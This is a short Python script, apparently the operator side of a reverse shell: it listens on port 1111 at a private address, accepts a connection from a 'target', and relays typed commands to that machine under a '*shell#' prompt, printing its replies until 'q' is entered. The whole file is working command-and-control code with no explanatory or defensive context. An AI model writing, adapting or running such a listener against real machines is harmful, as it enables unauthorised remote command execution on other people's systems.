#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("10.12.27.235", 1111))
s.listen(5)
print("Listening for Incoming connection")
target, ip = s.accept()
print("Targated connected")
while True:
    message = input("*shell#~%s:" % str(ip))
    target.send(message.encode())
    if message == "q":
        break

    else:
        answer = target.recv(1024).decode()
        print(answer)

s.close()
